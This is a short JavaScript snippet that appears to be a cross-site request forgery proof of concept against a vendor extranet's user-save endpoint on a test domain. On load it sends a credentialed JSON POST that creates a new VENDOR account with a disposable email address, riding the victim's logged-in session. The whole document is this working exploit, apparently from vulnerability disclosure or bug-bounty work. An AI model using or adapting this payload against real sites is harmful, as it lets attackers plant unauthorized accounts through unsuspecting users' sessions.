function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://extranet.bokuntest.com/users/save", true);
        xhr.setRequestHeader("accept", "application/json, text/javascript, */*; q=0.01");
        xhr.setRequestHeader("accept-language", "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("content-type", "application/json");
        xhr.withCredentials = true;
        var body = "{\"id\":null,\"role\":\"VENDOR\",\"namedUserRoleId\":12092,\"agent\":{\"id\":null},\"supportVendors\":[],\"canDisguiseAsAnyVendor\":false,\"firstName\":\"Engin\",\"lastName\":\"Demirbilek\",\"username\":\"newadded2@yopmail.com\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }

submitRequest();
